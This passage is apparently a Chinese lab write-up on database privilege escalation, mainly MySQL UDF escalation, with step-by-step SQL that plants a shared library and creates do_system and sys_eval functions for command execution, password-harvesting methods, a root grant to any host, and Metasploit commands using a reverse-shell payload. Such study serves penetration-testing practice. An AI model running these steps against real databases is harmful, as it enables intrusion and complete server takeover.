href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 </a></h4><h4 id="➢-提权条件-数据库帐号密码获取方式"><a href="#➢-提权条件-数据库帐号密码获取方式" class="headerlink" title="➢ 提权条件-数据库帐号密码获取方式"></a>➢ 提权条件-数据库帐号密码获取方式</h4><h4 id="➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><h4 id="➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h4><h4 id="➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h4></blockquote><h3 id="Linux第一篇复现注意点"><a href="#Linux第一篇复现注意点" class="headerlink" title="#Linux第一篇复现注意点"></a>#Linux第一篇复现注意点</h3><h5 id="步骤kali上搜索Linux-udf提权脚本"><a href="#步骤kali上搜索Linux-udf提权脚本" class="headerlink" title="步骤kali上搜索Linux udf提权脚本"></a>步骤kali上搜索Linux udf提权脚本</h5><ol><li><h6 id="将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下"><a href="#将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下" class="headerlink" title="将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下"></a>将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下</h6><h6 id="gcc-g-c-1518-c"><a href="#gcc-g-c-1518-c" class="headerlink" title="gcc -g -c 1518.c"></a>gcc -g -c 1518.c</h6><h6 id="gcc-g-shared-o-1518-so-1518-o"><a href="#gcc-g-shared-o-1518-so-1518-o" class="headerlink" title="gcc -g -shared -o 1518.so 1518.o"></a>gcc -g -shared -o 1518.so 1518.o</h6></li><li><h6 id="将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下"><a href="#将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下" class="headerlink" title="将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下"></a>将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下</h6></li><li><h6 id="进入数据库进行udf提权"><a href="#进入数据库进行udf提权" class="headerlink" title="进入数据库进行udf提权"></a>进入数据库进行udf提权</h6></li><li><h6 id="use-mysql-进入数据库"><a href="#use-mysql-进入数据库" class="headerlink" title="use mysql; #进入数据库"></a>use mysql; #进入数据库</h6></li><li><h6 id="create-table-foo-line-blob-创建数据表"><a href="#create-table-foo-line-blob-创建数据表" class="headerlink" title="create table foo(line blob); #创建数据表"></a>create table foo(line blob); #创建数据表</h6></li><li><h6 id="insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的"><a href="#insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的" class="headerlink" title="insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的"></a>insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的</h6></li><li><h6 id="select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个"><a href="#select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个" class="headerlink" title="select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)"></a>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)</h6></li><li><h6 id="create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功"><a href="#create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功" class="headerlink" title="create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)"></a>create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)</h6></li><li><h6 id="select-from-mysql-func"><a href="#select-from-mysql-func" class="headerlink" title="select * from mysql.func;"></a>select * from mysql.func;</h6></li><li><h6 id="使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权"><a href="#使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权" class="headerlink" title="使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权"></a>使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权</h6></li></ol><h6 id="我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功"><a href="#我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功" class="headerlink" title="我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功"></a>我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421170532141.png" alt="image-20230421170532141"></p><h6 id="但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误"><a href="#但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误" class="headerlink" title="但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误"></a>但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172032009.png" alt="image-20230421172032009"></p><h6 id="参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"><a href="#参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下" class="headerlink" title="参考了文章Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"></a>参考了文章<a href="https://blog.csdn.net/kaip_TJU/article/details/103112421">Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客</a>，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172415704.png" alt="image-20230421172415704"></p><h6 id="函数创建成功"><a href="#函数创建成功" class="headerlink" title="函数创建成功"></a>函数创建成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172513868.png" alt="image-20230421172513868"></p><h3 id="提权条件-数据库帐号密码获取方式"><a href="#提权条件-数据库帐号密码获取方式" class="headerlink" title="#提权条件-数据库帐号密码获取方式"></a>#提权条件-数据库帐号密码获取方式</h3><h4 id="条件一：数据库的最高权限用户的密码"><a href="#条件一：数据库的最高权限用户的密码" class="headerlink" title="条件一：数据库的最高权限用户的密码"></a>条件一：数据库的最高权限用户的密码</h4><h4 id="条件二：secure-file-priv没进行目录限制"><a href="#条件二：secure-file-priv没进行目录限制" class="headerlink" title="条件二：secure-file-priv没进行目录限制"></a>条件二：secure-file-priv没进行目录限制</h4><blockquote><h4 id="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果"><a href="#如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果" class="headerlink" title="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)，但是前提是加入后MYSQL服务得重启才有效果"></a>如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，<a href="https://www.cnblogs.com/KHZ521/p/14066258.html">Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)</a>，但是前提是加入后MYSQL服务得重启才有效果</h4></blockquote><h5 id="1、网站存在高权限SQL注入点"><a href="#1、网站存在高权限SQL注入点" class="headerlink" title="1、网站存在高权限SQL注入点"></a>1、网站存在高权限SQL注入点</h5><h5 id="2、数据库的存储文件或备份文件"><a href="#2、数据库的存储文件或备份文件" class="headerlink" title="2、数据库的存储文件或备份文件"></a>2、数据库的存储文件或备份文件</h5><h5 id="3、网站应用源码中的数据库配置文件"><a href="#3、网站应用源码中的数据库配置文件" class="headerlink" title="3、网站应用源码中的数据库配置文件"></a>3、网站应用源码中的数据库配置文件</h5><h5 id="4、采用工具或脚本爆破-需解决外联问题"><a href="#4、采用工具或脚本爆破-需解决外联问题" class="headerlink" title="4、采用工具或脚本爆破(需解决外联问题)"></a>4、采用工具或脚本爆破(需解决外联问题)</h5><h6 id="如果存在注入点，用sqlmap爆破密码"><a href="#如果存在注入点，用sqlmap爆破密码" class="headerlink" title="如果存在注入点，用sqlmap爆破密码"></a>如果存在注入点，用sqlmap爆破密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104545651.png" alt="image-20230419104545651"></p><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104644625.png" alt="image-20230419104644625"></p><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104710312.png" alt="image-20230419104710312"></p><h6 id="如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来"><a href="#如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来" class="headerlink" title="如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来"></a>如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104149953.png" alt="image-20230419104149953"></p><h6 id="打开这个文件，可以看到加密后的密码，MD5网站解密即可"><a href="#打开这个文件，可以看到加密后的密码，MD5网站解密即可" class="headerlink" title="打开这个文件，可以看到加密后的密码，MD5网站解密即可"></a>打开这个文件，可以看到加密后的密码，MD5网站解密即可</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104224588.png" alt="image-20230419104224588"></p><h6 id="还可以查看配置文件"><a href="#还可以查看配置文件" class="headerlink" title="还可以查看配置文件"></a>还可以查看配置文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104843766.png" alt="image-20230419104843766"></p><h6 id="打开就可以看到用户密码"><a href="#打开就可以看到用户密码" class="headerlink" title="打开就可以看到用户密码"></a>打开就可以看到用户密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104901451.png" alt="image-20230419104901451"></p><h4 id="MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><p><a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p><h4 id="4种方法"><a href="#4种方法" class="headerlink" title="4种方法"></a>4种方法</h4><h4 id="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"><a href="#都建立在数据库开启了写入文件的功能上，即secure-file-priv开启" class="headerlink" title="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"></a>都建立在数据库开启了写入文件的功能上，即secure-file-priv开启</h4><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114724609.png" alt="image-20230419114724609"></p><h5 id="方法1、UDF"><a href="#方法1、UDF" class="headerlink" title="方法1、UDF"></a>方法1、UDF</h5><h6 id="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"><a href="#获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续" class="headerlink" title="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"></a>获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续</h6><ul><li><h6 id="mysql-lt-5-2-导出目录c-x2F-windows或system32"><a href="#mysql-lt-5-2-导出目录c-x2F-windows或system32" class="headerlink" title="mysql&lt;5.2 导出目录c:&#x2F;windows或system32"></a>mysql&lt;5.2 导出目录c:&#x2F;windows或system32</h6></li><li><h6 id="mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F"><a href="#mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F" class="headerlink" title="mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;"></a>mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</h6></li><li><p>查看版本：select version()   查看安装目录：select @@basedir</p></li><li><p>开启数据库外连：</p><p><code>GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION;</code></p><p><code>FLUSH PRIVILEGES;（刷新）</code></p></li><li><p>关闭数据库外连：</p><p><code>UPDATE mysql.user SET Host=&#39;localhost&#39; WHERE User=&#39;root&#39; AND Host=&#39;%&#39;;</code><br><code>FLUSH PRIVILEGES;（刷新</code>）</p></li><li><p><a href="https://www.cnblogs.com/zzjdbk/p/12992355.html">开启mysql外部访问(root外连) - My_Dreams - 博客园 (cnblogs.com)</a></p></li><li><p>没有目录采用手工创建plugin目录或利用NTFS流创建 </p></li><li><p>使用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload 模块可以进行UDF提权,</p></li><li><p>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p></li></ul><h6 id="用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库"><a href="#用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库" class="headerlink" title="用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)"></a>用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013644140.png" alt="image-20230420013644140"></p><h6 id="但是外部软件尝试连接，会拒绝，原因是没有开启外连"><a href="#但是外部软件尝试连接，会拒绝，原因是没有开启外连" class="headerlink" title="但是外部软件尝试连接，会拒绝，原因是没有开启外连"></a>但是外部软件尝试连接，会拒绝，原因是没有开启外连</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013821125.png" alt="image-20230420013821125"></p><h6 id="先判断数据库的版本"><a href="#先判断数据库的版本" class="headerlink" title="先判断数据库的版本"></a>先判断数据库的版本</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105424511.png" alt="image-20230419105424511"></p><h6 id="用sql语句查看安装目录"><a href="#用sql语句查看安装目录" class="headerlink" title="用sql语句查看安装目录"></a>用sql语句查看安装目录</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105520677.png" alt="image-20230419105520677"></p><h6 id="然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用"><a href="#然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用" class="headerlink" title="然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用"></a>然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105625537.png" alt="image-20230419105625537"></p><h5 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h5><h5 id="先MSF-（前提先开外链）"><a href="#先MSF-（前提先开外链）" class="headerlink" title="先MSF:（前提先开外链）"></a>先MSF:（前提先开外链）</h5><ul><li><h6 id="这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"><a href="#这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传" class="headerlink" title="这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"></a>这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传</h6></li><li><p>可能出现的问题及原因：</p></li><li><p><strong>1、</strong><a href="https://www.cnblogs.com/shanmao/p/12045560.html">Exploit completed, but no session was created. - 山貓 - 博客园 (cnblogs.com)</a></p></li><li><p><strong>2、</strong>msf创建的sys_exec()函数无回显，得创建sys_eval()才有回显：<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">MySQL UDF提权执行系统命令_谢公子mysql提权_谢公子的博客-CSDN博客</a></p></li><li><p>常规执行如下：</p></li><li><p>use exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload</p></li><li><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p></li><li><p>set password root</p></li><li><p>set rhosts 47.102.195.100</p></li><li><p>run</p></li></ul><h5 id="接着Navicat实现"><a href="#接着Navicat实现" class="headerlink" title="接着Navicat实现:"></a>接着Navicat实现:</h5><ul><li><h6 id="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"><a href="#（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）" class="headerlink" title="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"></a>（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）</h6></li><li><p>手动可能出现的问题：<a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p></li><li><p>开外联后使用MSF导出，在执行后续命令调用执行</p></li><li><p>select * from mysql.func where name &#x3D; “sys_exec”; &#x2F;&#x2F;查看</p></li><li><p>create function sys_eval returns string soname “IpKFJktF.dll”;&#x2F;&#x2F;创建函数绑定dll，linux里面是.so文件</p></li><li><p>select sys_eval(“whoami”);&#x2F;&#x2F;调用函数进行命令执行</p></li></ul><h6 id="演示上述："><a href="#演示上述：" class="headerlink" title="演示上述："></a>演示上述：</h6><h6 id="选择模块后show-options"><a href="#选择模块后show-options" class="headerlink" title="选择模块后show options"></a>选择模块后show options</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105839820.png" alt="image-20230419105839820"></p><h6 id="按照命令往下敲"><a href="#按照命令往下敲" class="headerlink" title="按照命令往下敲"></a>按照命令往下敲</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110437759.png" alt="image-20230419110437759"></p><h6 id="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"><a href="#这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下" class="headerlink" title="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"></a>这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110238004.png" alt="image-20230419110238004"></p><h6 id="执行完后发现有个-，这表明任意主机都可以连接这个数据库"><a href="#执行完后发现有个-，这表明任意主机都可以连接这个数据库" class="headerlink" title="执行完后发现有个%，这表明任意主机都可以连接这个数据库"></a>执行完后发现有个%，这表明任意主机都可以连接这个数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110318452.png" alt="image-20230419110318452"></p><h6 id="然后run"><a href="#然后run" class="headerlink" title="然后run"></a>然后run</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419111222983.png" alt="image-20230419111222983"></p><h6 id="随后会在目录下产生一个dll文件"><a href="#随后会在目录下产生一个dll文件" class="headerlink" title="随后会在目录下产生一个dll文件"></a>随后会在目录下产生一个dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003605333.png" alt="image-20230421003605333"></p><h6 id="也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令"><a href="#也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令" class="headerlink" title="也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令"></a>也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003918467.png" alt="image-20230421003918467"></p><h6 id="但是用sys-exec来-执行命令，会没有回显，只会显示数字"><a href="#但是用sys-exec来-执行命令，会没有回显，只会显示数字" class="headerlink" title="但是用sys_exec来 执行命令，会没有回显，只会显示数字"></a>但是用sys_exec来 执行命令，会没有回显，只会显示数字</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003010588.png" alt="image-20230421003010588"></p><h6 id="所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显"><a 